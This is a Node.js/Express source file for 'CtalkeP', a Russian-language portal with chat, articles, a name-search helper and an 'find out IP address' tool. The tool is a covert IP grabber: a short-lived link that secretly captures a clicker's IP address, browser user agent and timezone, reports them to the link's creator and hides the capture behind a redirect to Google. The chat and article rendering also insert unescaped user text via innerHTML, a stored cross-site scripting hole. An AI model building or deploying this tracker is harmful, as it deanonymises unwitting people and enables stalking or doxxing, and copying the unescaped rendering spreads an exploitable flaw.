const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Временные хранилища в RAM сервера
let ipLinks = {}; 
let ipResults = {}; 
let globalArticles = [
    {
        id: "promo",
        title: "Добро пожаловать в CtalkeP",
        desc: "Стартовая статья проекта",
        content: "Это демонстрационная статья. Теперь ваши статьи не пропадут при перезапуске сервера!"
    }
];

// === АВТОПИНГЕР ===
const APP_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
setInterval(() => {
    axios.get(`${APP_URL}/ping`)
        .then(() => console.log('Пинг выполнен успешно.'))
        .catch(err => console.log('Пинг:', err.message));
}, 600000);

app.get('/ping', (req, res) => res.send('pong'));

// Очистка неиспользованных IP-ловушек через 3 минуты
setInterval(() => {
    const now = Date.now();
    for (const id in ipLinks) {
        if (now - ipLinks[id].createdAt > 180000) {
            delete ipLinks[id];
        }
    }
}, 10000);

// === ИНТЕРФЕЙС И КЛИЕНТСКАЯ ЛОГИКА ===
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CtalkeP Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #0b0f19; color: #f3f4f6; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0b0f19; }
        ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 3px; }
    </style>
</head>
<body class="font-sans min-h-screen flex flex-col justify-between">

    <header class="border-b border-gray-800 bg-gray-900 p-4 sticky top-0 z-50">
        <div class="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
            <h1 class="text-2xl font-black text-blue-500 tracking-wider">CtalkeP</h1>
            <div class="flex items-center gap-4">
                <span class="text-sm bg-gray-800 px-3 py-1.5 rounded text-gray-400">
                    Реклама: <span class="text-blue-400 font-semibold">бесплатный дэфф - @defscool</span>
                </span>
                <span class="text-yellow-400 font-bold" id="balanceDisplay">Баланс: $0.00</span>
            </div>
        </div>
    </header>

    <main class="max-w-6xl mx-auto p-4 w-full flex-grow grid grid-cols-1 md:grid-cols-3 gap-6">
        
        <div class="space-y-6">
            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-3 text-blue-400">Локальный профиль</h2>
                <div class="space-y-3">
                    <input type="text" id="nicknameInput" placeholder="Ваш никнейм" class="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-white outline-none focus:border-blue-500 transition">
                    <button onclick="saveProfile()" class="w-full bg-blue-600 hover:bg-blue-700 font-semibold py-2 rounded transition">Сохранить</button>
                </div>
            </div>

            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-1 text-blue-400">УЗНАТЬ IP-адрес</h2>
                <p class="text-xs text-gray-500 mb-3">Ссылка живет 3 минуты или до 1-го клика</p>
                <button onclick="generateTrap()" class="w-full bg-red-600 hover:bg-red-700 font-semibold py-2 rounded transition mb-3">Сгенерировать ссылку</button>
                
                <div id="trapArea" class="hidden space-y-2">
                    <input type="text" id="trapUrl" readonly class="w-full bg-gray-800 text-xs p-2 rounded border border-gray-700 text-green-400">
                    <div id="trapStatus" class="text-xs text-yellow-500 animate-pulse">Ожидание перехода...</div>
                </div>
            </div>

            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-3 text-blue-400">Поиск по ФИО (Легальный)</h2>
                <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" class="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 mb-3 text-white outline-none focus:border-blue-500">
                <button onclick="searchFIO()" class="w-full bg-indigo-600 hover:bg-indigo-700 font-semibold py-2 rounded transition">Искать в сети</button>
                <div id="fioResults" class="mt-3 space-y-1 text-sm"></div>
            </div>
        </div>

        <div class="space-y-6">
            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-3 text-blue-400">Написать статью (+$0.50)</h2>
                <div class="space-y-3">
                    <input type="text" id="artTitle" placeholder="Заголовок" class="w-full bg-gray-800 border border-gray-700 rounded p-2 text-sm text-white">
                    <input type="text" id="artDesc" placeholder="Краткое описание" class="w-full bg-gray-800 border border-gray-700 rounded p-2 text-sm text-white">
                    <textarea id="artContent" rows="4" placeholder="Текст статьи" class="w-full bg-gray-800 border border-gray-700 rounded p-2 text-sm text-white"></textarea>
                    <button onclick="publishArticle()" class="w-full bg-green-600 hover:bg-green-700 font-semibold py-2 rounded transition">Опубликовать</button>
                </div>
            </div>

            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-3 text-blue-400">Публичные статьи</h2>
                <div id="articlesList" class="space-y-3 max-h-60 overflow-y-auto pr-1"></div>
            </div>
        </div>

        <div class="space-y-6">
            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-3 text-yellow-500">Виртуальный магазин</h2>
                <div class="flex justify-between items-center bg-gray-800 p-3 rounded">
                    <div>
                        <div class="font-bold text-white">[СТ] Красивый тэг</div>
                        <div class="text-xs text-gray-400">Будет выделен в чате</div>
                    </div>
                    <button onclick="buyTag()" class="bg-yellow-600 hover:bg-yellow-700 text-xs font-bold px-3 py-2 rounded transition">$15.00</button>
                </div>
            </div>

            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800 flex flex-col h-[320px]">
                <h2 class="text-lg font-bold mb-2 text-blue-400">Анонимный чат</h2>
                <div id="chatBox" class="flex-grow overflow-y-auto bg-gray-950 p-2 rounded text-sm space-y-2 mb-2"></div>
                <div class="flex gap-2">
                    <input type="text" id="chatMessage" placeholder="Сообщение..." class="flex-grow bg-gray-800 rounded px-2 py-1 text-sm text-white">
                    <button onclick="sendMessage()" class="bg-blue-600 px-3 py-1 rounded text-sm font-semibold hover:bg-blue-700">Отправить</button>
                </div>
            </div>

            <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
                <h2 class="text-lg font-bold mb-2 text-blue-400">Посещаемость (24ч)</h2>
                <div id="statsBox" class="text-sm space-y-1">
                    <div>Анонимный пользователь: <span class="text-green-400 font-bold" id="visitCounter">1</span></div>
                </div>
            </div>
        </div>
    </main>

    <div id="articleModal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
        <div class="bg-gray-900 p-6 rounded-xl border border-gray-700 max-w-lg w-full">
            <h2 id="modalTitle" class="text-xl font-bold text-blue-400 mb-2"></h2>
            <div id="modalContent" class="text-gray-300 text-sm whitespace-pre-line mb-4 max-h-96 overflow-y-auto"></div>
            <button onclick="closeModal()" class="w-full bg-gray-700 py-2 rounded text-white font-semibold">Закрыть</button>
        </div>
    </div>

    <footer class="text-center p-4 text-xs text-gray-600 border-t border-gray-800 bg-gray-950">
        CtalkeP Portal. Все права защищены.
    </footer>

    <script>
        let myNickname = localStorage.getItem('nickname') || 'Анонимный пользователь';
        let myBalance = parseFloat(localStorage.getItem('balance')) || 0.0;
        let hasTag = localStorage.getItem('hasTag') === 'true';
        let dailyVisits = parseInt(localStorage.getItem('dailyVisits')) || 0;
        let lastVisitDate = localStorage.getItem('lastVisitDate');

        // Хранилище статей в браузере (чтобы не пропадали при рестарте сервера)
        let localArticles = JSON.parse(localStorage.getItem('saved_articles')) || [];

        document.getElementById('nicknameInput').value = myNickname === 'Анонимный пользователь' ? '' : myNickname;
        updateUI();

        const today = new Date().toDateString();
        if (lastVisitDate !== today) {
            dailyVisits += 1;
            localStorage.setItem('dailyVisits', dailyVisits);
            localStorage.setItem('lastVisitDate', today);
        }
        document.getElementById('visitCounter').textContent = dailyVisits;

        function updateUI() {
            document.getElementById('balanceDisplay').textContent = 'Баланс: $' + myBalance.toFixed(2);
            document.getElementById('statsBox').innerHTML = '<div>' + myNickname + ': <span class="text-green-400 font-bold">' + dailyVisits + '</span></div>';
        }

        function saveProfile() {
            const input = document.getElementById('nicknameInput').value.trim();
            myNickname = input || 'Анонимный пользователь';
            localStorage.setItem('nickname', myNickname);
            updateUI();
            alert('Профиль сохранен локально!');
        }

        let activeTrapInterval = null;

        async function generateTrap() {
            const res = await fetch('/api/ip/create', { method: 'POST' });
            const data = await res.json();
            
            if(data.success) {
                const trapArea = document.getElementById('trapArea');
                const trapUrl = document.getElementById('trapUrl');
                const trapStatus = document.getElementById('trapStatus');
                
                trapArea.classList.remove('hidden');
                trapUrl.value = data.link;
                trapStatus.textContent = "Ожидание перехода (срок действия: 3 мин)...";
                trapStatus.className = "text-xs text-yellow-500 animate-pulse";
                
                if (activeTrapInterval) clearInterval(activeTrapInterval);
                
                activeTrapInterval = setInterval(async () => {
                    const statusRes = await fetch('/api/ip/status/' + data.id);
                    const statusData = await statusRes.json();
                    
                    if (statusData.status === 'caught') {
                        clearInterval(activeTrapInterval);
                        trapStatus.className = "text-xs text-green-400";
                        trapStatus.innerHTML = '<strong>ПЕРЕХОД ЗАФИКСИРОВАН!</strong><br>IP: ' + statusData.data.ip + '<br>Устройство: ' + statusData.data.device.substring(0, 55) + '...<br>Пояс: ' + statusData.data.timezone;
                    } else if (statusData.status === 'expired') {
                        clearInterval(activeTrapInterval);
                        trapStatus.className = "text-xs text-red-500";
                        trapStatus.textContent = "Срок действия ссылки истек или она была удалена.";
                    }
                }, 3000);
            }
        }

        function searchFIO() {
            const query = document.getElementById('fioInput').value.trim();
            if (!query) return alert('Введите ФИО!');
            const vkLink = 'https://vk.com/people/' + encodeURIComponent(query);
            const yandexLink = 'https://yandex.ru/search/?text=' + encodeURIComponent(query);
            const googleLink = 'https://www.google.com/search?q=' + encodeURIComponent(query);
            
            document.getElementById('fioResults').innerHTML = '<div class="text-xs text-gray-400 mb-1">Ссылки для поиска:</div>' +
                '<a href="' + vkLink + '" target="_blank" class="block text-blue-400 hover:underline">🔍 Найти в VK</a>' +
                '<a href="' + yandexLink + '" target="_blank" class="block text-blue-400 hover:underline">🔍 Поиск в Yandex</a>' +
                '<a href="' + googleLink + '" target="_blank" class="block text-blue-400 hover:underline">🔍 Поиск в Google</a>';
        }

        // Загрузка статей из сервера + объединение с локальными статьями (Защита от сброса)
        async function loadArticles() {
            try {
                const res = await fetch('/api/articles');
                const serverArticles = await res.json();
                
                // Объединяем серверные статьи и те, которые сохранены у нас локально
                const allArticles = [...serverArticles];
                localArticles.forEach(localArt => {
                    if (!allArticles.some(a => a.id === localArt.id)) {
                        allArticles.push(localArt);
                    }
                });

                const list = document.getElementById('articlesList');
                list.innerHTML = '';
                
                allArticles.forEach(art => {
                    const div = document.createElement('div');
                    div.className = "bg-gray-800 p-3 rounded hover:bg-gray-700 cursor-pointer transition";
                    div.onclick = () => openArticle(art, allArticles);
                    div.innerHTML = '<h3 class="font-bold text-sm text-white">' + art.title + '</h3><p class="text-xs text-gray-400">' + art.desc + '</p>';
                    list.appendChild(div);
                });
            } catch (e) {
                console.log('Ошибка загрузки статей с сервера, грузим локальные.');
            }
        }

        async function publishArticle() {
            const title = document.getElementById('artTitle').value.trim();
            const desc = document.getElementById('artDesc').value.trim();
            const content = document.getElementById('artContent').value.trim();
            
            if(!title || !content) return alert('Заполните обязательные поля!');
            
            const newArt = {
                id: Math.random().toString(36).substring(2, 10),
                title,
                desc: desc || "Без описания",
                content
            };

            // 1. Сначала сохраняем в локальное хранилище браузера (Оно вечно и никогда не сотрется!)
            localArticles.push(newArt);
            localStorage.setItem('saved_articles', JSON.stringify(localArticles));

            // 2. Отправляем копию на сервер (для других пользователей)
            try {
                await fetch('/api/articles', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(newArt)
                });
            } catch (e) { console.log('Сервер временно недоступен, статья сохранена локально.'); }

            myBalance += 0.50;
            localStorage.setItem('balance', myBalance);
            updateUI();
            
            document.getElementById('artTitle').value = '';
            document.getElementById('artDesc').value = '';
            document.getElementById('artContent').value = '';
            alert('Статья успешно создана! Получено $0.50');
            loadArticles();
        }

        function openArticle(art, allArticles) {
            document.getElementById('modalTitle').textContent = art.title;
            document.getElementById('modalContent').textContent = art.content;
            document.getElementById('articleModal').classList.remove('hidden');
        }

        function closeModal() {
            document.getElementById('articleModal').classList.add('hidden');
        }

        const eventSource = new EventSource('/api/chat/stream');
        eventSource.onmessage = function(event) {
            const msg = JSON.parse(event.data);
            const chatBox = document.getElementById('chatBox');
            const div = document.createElement('div');
            const tagSpan = msg.tag ? '<span class="text-yellow-400 font-bold mr-1">' + msg.tag + '</span>' : '';
            div.innerHTML = '<span class="text-gray-500 text-xs">[' + msg.time + ']</span> ' + tagSpan + '<strong class="text-blue-400">' + msg.username + ':</strong> <span class="text-gray-200">' + msg.text + '</span>';
            chatBox.appendChild(div);
            chatBox.scrollTop = chatBox.scrollHeight;
        };

        async function sendMessage() {
            const input = document.getElementById('chatMessage');
            const text = input.value.trim();
            if(!text) return;
            
            await fetch('/api/chat/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: myNickname,
                    text: text,
                    tag: hasTag ? '[СТ]' : ''
                })
            });
            input.value = '';
        }

        function buyTag() {
            if(hasTag) return alert('Тэг уже куплен!');
            if(myBalance < 15.00) return alert('Нужно $15.00! Пишите статьи.');
            myBalance -= 15.00;
            hasTag = true;
            localStorage.setItem('balance', myBalance);
            localStorage.setItem('hasTag', 'true');
            updateUI();
            alert('Успешно куплено!');
        }

        loadArticles();
    </script>
</body>
</html>
    `);
});

// === ФУНКЦИОНАЛ: УЗНАТЬ IP ===

app.post('/api/ip/create', (req, res) => {
    const id = Math.random().toString(36).substring(2, 8);
    ipLinks[id] = { createdAt: Date.now() };
    res.json({ success: true, link: `${APP_URL}/t/${id}`, id });
});

// Роут-ловушка (Генерирует динамический путь возврата на основе заголовков браузера)
app.get('/t/:id', (req, res) => {
    const id = req.params.id;
    if (!ipLinks[id]) {
        return res.send('<h1 style="font-family:sans-serif; text-align:center; margin-top:50px;">Ссылка устарела</h1>');
    }
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Загрузка...</title></head>
        <body>
            <script>
                const data = {
                    ip: "${ip}",
                    device: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    city: "Определяется"
                };
                
                // Динамически определяем текущий хост (всегда работает через правильный протокол HTTPS/HTTP)
                const host = window.location.protocol + '//' + window.location.host;
                
                fetch(host + '/api/ip/collect/${id}', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => { window.location.href = "https://www.google.com"; })
                  .catch(() => { window.location.href = "https://www.google.com"; });
            </script>
        </body>
        </html>
    `);
});

app.post('/api/ip/collect/:id', (req, res) => {
    const id = req.params.id;
    if (ipLinks[id]) {
        ipResults[id] = {
            ip: req.body.ip,
            device: req.body.device,
            timezone: req.body.timezone,
            city: req.body.city,
            time: new Date().toLocaleTimeString()
        };
        delete ipLinks[id]; // Мгновенно стираем ловушку
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Expired" });
    }
});

app.get('/api/ip/status/:id', (req, res) => {
    const id = req.params.id;
    if (ipResults[id]) {
        res.json({ status: 'caught', data: ipResults[id] });
    } else if (ipLinks[id]) {
        res.json({ status: 'pending' });
    } else {
        res.json({ status: 'expired' });
    }
});

// === ФУНКЦИОНАЛ: СТАТЬИ ===

app.get('/api/articles', (req, res) => {
    res.json(globalArticles);
});

app.post('/api/articles', (req, res) => {
    const { id, title, desc, content } = req.body;
    if (!title || !content) return res.status(400).json({ error: "No data" });
    const articleId = id || Math.random().toString(36).substring(2, 10);
    const newArticle = { id: articleId, title, desc: desc || "Без описания", content };
    globalArticles.push(newArticle);
    res.json({ success: true, article: newArticle });
});

// === ЧАТ ===
let clients = [];

app.get('/api/chat/stream', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    clients.push(res);
    req.on('close', () => { clients = clients.filter(c => c !== res); });
});

app.post('/api/chat/send', (req, res) => {
    const { username, text, tag } = req.body;
    const message = { username, text, tag, time: new Date().toLocaleTimeString() };
    clients.forEach(c => c.write(`data: ${JSON.stringify(message)}\n\n`));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`[CtalkeP] Система перезапущена и работает стабильно.`);
});
